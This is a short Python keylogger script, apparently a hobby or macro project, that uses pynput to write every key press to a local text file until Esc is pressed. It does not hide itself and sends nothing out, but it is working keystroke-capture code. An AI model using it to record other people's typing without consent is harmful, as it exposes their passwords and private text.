from pynput.keyboard import Listener
import pyautogui

path_loc = "/macros/p3_key_logger/key_logs.txt"
key_logs = open(path_loc, "w")


def write_to_file(listened_key):
    key = str(listened_key).strip("'")

    if key == "Key.esc":
        return False

    if key == "Key.enter":
        key = "\n"
    elif key == "Key.space":
        key = " "
    elif key == "Key.shift":
        key = ""
    elif key == "Key.backspace":
        key = "|del|"

    key_logs.write(key)
    key_logs.flush()


with Listener(on_press=write_to_file) as li:
    li.join()

key_logs.close()
